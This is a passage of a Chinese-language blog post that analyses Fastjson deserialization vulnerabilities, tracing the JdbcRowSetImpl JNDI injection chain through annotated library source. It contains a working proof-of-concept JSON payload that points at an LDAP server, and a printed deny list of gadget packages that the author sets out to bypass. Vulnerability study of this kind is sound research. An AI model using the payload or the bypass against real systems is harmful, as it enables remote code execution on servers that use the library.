</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">key</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;&#34;&#39;</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">key</span> <span class="o">=</span> <span class="n">lexer</span><span class="o">.</span><span class="na">scanSymbol</span><span class="o">(</span><span class="n">symbolTable</span><span class="o">,</span> <span class="sc">&#39;&#34;&#39;</span><span class="o">);</span> <span class="c1">// 此时key = @type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">lexer</span><span class="o">.</span><span class="na">skipWhitespace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                    <span class="n">ch</span> <span class="o">=</span> <span class="n">lexer</span><span class="o">.</span><span class="na">getCurrent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">ch</span> <span class="o">!=</span> <span class="sc">&#39;:&#39;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;expect &#39;:&#39; at &#34;</span> <span class="o">+</span> <span class="n">lexer</span><span class="o">.</span><span class="na">pos</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;, name &#34;</span> <span class="o">+</span> <span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_TYPE_KEY</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">lexer</span><span class="o">.</span><span class="na">isEnabled</span><span class="o">(</span><span class="n">Feature</span><span class="o">.</span><span class="na">DisableSpecialKeyDetect</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">typeName</span> <span class="o">=</span> <span class="n">lexer</span><span class="o">.</span><span class="na">scanSymbol</span><span class="o">(</span><span class="n">symbolTable</span><span class="o">,</span> <span class="sc">&#39;&#34;&#39;</span><span class="o">);</span> <span class="c1">// 提取出typeName为com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">config</span><span class="o">.</span><span class="na">getDefaultClassLoader</span><span class="o">());</span> <span class="c1">// 通过TypeUtils.loadClass进行loadClass操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">ObjectDeserializer</span> <span class="n">deserializer</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="na">getDeserializer</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">deserializer</span><span class="o">.</span><span class="na">deserialze</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>TypeUtils.lodaClass</code>中首先判断当前类名是否在内置类名单中,不存在则进行<code>loadClass</code>并将类名添加到内置类名单中,返回加载类</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.util.TypeUtils
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">ClassLoader</span> <span class="n">classLoader</span><span class="o">)</span> <span class="o">{</span><span class="c1">//classLoader = null
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">mappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">className</span><span class="o">);</span> <span class="c1">// mappings中存放了一部分内置类,首先判断当前类名是否在内置类中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;[&#39;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">componentType</span> <span class="o">=</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="n">classLoader</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">componentType</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">getClass</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;L&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">className</span><span class="o">.</span><span class="na">endsWith</span><span class="o">(</span><span class="s">&#34;;&#34;</span><span class="o">))</span> <span class="o">{</span><span class="c1">//去除开头的L和结尾的;,后续版本可用于绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">newClassName</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">newClassName</span><span class="o">,</span> <span class="n">classLoader</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">contextClassLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">contextClassLoader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">clazz</span> <span class="o">=</span> <span class="n">contextClassLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">);</span> <span class="c1">// 加载com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">mappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span> <span class="c1">// 并将com.sun.rowset.JdbcRowSetImpl添加到内置类中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>loadClass</code>加载出的类,通过<code>ParserConfig</code>进行黑名单检查,判断是否能够进行反序列化处理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.ParserConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">ObjectDeserializer</span> <span class="nf">getDeserializer</span><span class="o">(</span><span class="n">Type</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">type</span> <span class="k">instanceof</span> <span class="n">Class</span><span class="o">&lt;?&gt;)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">getDeserializer</span><span class="o">((</span><span class="n">Class</span><span class="o">&lt;?&gt;)</span> <span class="n">type</span><span class="o">,</span> <span class="n">type</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.ParserConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">ObjectDeserializer</span> <span class="nf">getDeserializer</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Type</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">className</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">denyList</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">deny</span> <span class="o">=</span> <span class="n">denyList</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 通过黑名单限制可以反序列化的类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// 1.2.24的黑名单只有java.lang.Thread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">deny</span><span class="o">))</span> <span class="o">{</span> <span class="c1">// 黑名单判断
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;parser deny : &#34;</span> <span class="o">+</span> <span class="n">className</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png, https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png 1.5x, https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png"
        title="https://img.mi3aka.eu.org/2023/02/875999f3f55130fb03b5fdeedb3b290f.png" /></p>
<h3 id="jdbcrowsetimpl分析">JdbcRowSetImpl分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">Fastjson 1.2.25之前版本,只是通过黑名单限制哪些类不能通过@type指定
</span></span></span><span class="line"><span class="cl"><span class="cm">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
</span></span></span><span class="line"><span class="cl"><span class="cm">com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="cm">都不在黑名单中,可以直接完成攻击
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_24</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;: \&#34;com.sun.rowset.JdbcRowSetImpl\&#34;, \&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/377f07bb420e9dc44b9938f0cbadbb82.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/377f07bb420e9dc44b9938f0cbadbb82.png, https://img.mi3aka.eu.org/2023/02/377f07bb420e9dc44b9938f0cbadbb82.png 1.5x, https://img.mi3aka.eu.org/2023/02/377f07bb420e9dc44b9938f0cbadbb82.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/377f07bb420e9dc44b9938f0cbadbb82.png"
        title="https://img.mi3aka.eu.org/2023/02/377f07bb420e9dc44b9938f0cbadbb82.png" /></p>
<blockquote>
<p>链条分析</p>
</blockquote>
<p>把断点下在<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue</code>方法中</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/90e7e7f2cb26a94f005686dffe441923.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/90e7e7f2cb26a94f005686dffe441923.png, https://img.mi3aka.eu.org/2023/02/90e7e7f2cb26a94f005686dffe441923.png 1.5x, https://img.mi3aka.eu.org/2023/02/90e7e7f2cb26a94f005686dffe441923.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/90e7e7f2cb26a94f005686dffe441923.png"
        title="https://img.mi3aka.eu.org/2023/02/90e7e7f2cb26a94f005686dffe441923.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/65397b65002050e6d8e39a5dde3c99d2.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/65397b65002050e6d8e39a5dde3c99d2.png, https://img.mi3aka.eu.org/2023/02/65397b65002050e6d8e39a5dde3c99d2.png 1.5x, https://img.mi3aka.eu.org/2023/02/65397b65002050e6d8e39a5dde3c99d2.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/65397b65002050e6d8e39a5dde3c99d2.png"
        title="https://img.mi3aka.eu.org/2023/02/65397b65002050e6d8e39a5dde3c99d2.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.deserializer.FieldDeserializer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span><span class="c1">//object = JdbcRowSetImpl , value = ldap地址/AutoCommit的布尔值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">fieldInfo</span><span class="o">.</span><span class="na">method</span><span class="o">;</span><span class="c1">//method为com.sun.rowset.JdbcRowSetImpl.setDataSourceName/setAutoCommit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">method</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">fieldInfo</span><span class="o">.</span><span class="na">getOnly</span><span class="o">)</span> <span class="o">{</span><span class="c1">//false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span><span class="c1">//反射调用,将DataSourceName值设置为ldap地址/设置AutoCommit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/3b213411f1352d9476f0b9e0c56aed96.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/3b213411f1352d9476f0b9e0c56aed96.png, https://img.mi3aka.eu.org/2023/02/3b213411f1352d9476f0b9e0c56aed96.png 1.5x, https://img.mi3aka.eu.org/2023/02/3b213411f1352d9476f0b9e0c56aed96.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/3b213411f1352d9476f0b9e0c56aed96.png"
        title="https://img.mi3aka.eu.org/2023/02/3b213411f1352d9476f0b9e0c56aed96.png" /></p>
<p>在<code>JdbcRowSetImpl</code>的<code>setAutoCommit</code>函数中,会进行<code>connect</code>操作,通过<code>connect</code>链接ldap并进行jndi注入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAutoCommit</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">autoCommit</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">conn</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">           <span class="n">conn</span><span class="o">.</span><span class="na">setAutoCommit</span><span class="o">(</span><span class="n">autoCommit</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">           <span class="c1">// Coming here means the connection object is null.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>           <span class="c1">// So generate a connection handle internally, since a JdbcRowSet is always connected to a db, it is fine to get a handle to the connection.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>           <span class="c1">// Get hold of a connection handle and change the autcommit as passesd.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>           <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">           <span class="n">conn</span><span class="o">.</span><span class="na">setAutoCommit</span><span class="o">(</span><span class="n">autoCommit</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Connection</span> <span class="nf">connect</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">conn</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">conn</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">getDataSourceName</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Connect using JNDI.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Context</span> <span class="n">ctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">DataSource</span> <span class="n">ds</span> <span class="o">=</span> <span class="o">(</span><span class="n">DataSource</span><span class="o">)</span><span class="n">ctx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">getDataSourceName</span><span class="o">());</span><span class="c1">//getDataSourceName()返回了ldap地址,lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="templatesimpl分析">TemplatesImpl分析</h3>
<blockquote>
<p>todo</p>
</blockquote>
<h2 id="1225-41">1.2.25-41</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">添加了配置项setAutoTypeSupport,并且使用了checkAutoType函数定义黑白名单的方式来防御反序列化漏洞
</span></span></span><span class="line"><span class="cl"><span class="cm">当autoTypeSupport为False时,先黑名单过滤,然后再匹配白名单,如果白名单没匹配到则报错,所以必须配置有白名单,才能进行loadClass操作
</span></span></span><span class="line"><span class="cl"><span class="cm">当autoTypeSupport为True时,首先进行白名单过滤,如果在白名单上则直接loadClass,否则进行黑名单过滤
</span></span></span><span class="line"><span class="cl"><span class="cm">com.alibaba.fastjson.parser.ParserConfig类中有一个String[]类型的denyList数组,denyList中定义了反序列化的黑名单的类包名,1.2.25-1.2.41版本中会对以下包名进行过滤
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">[bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework]
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">因此需要对checkAutoType函数中的黑名单进行绕过
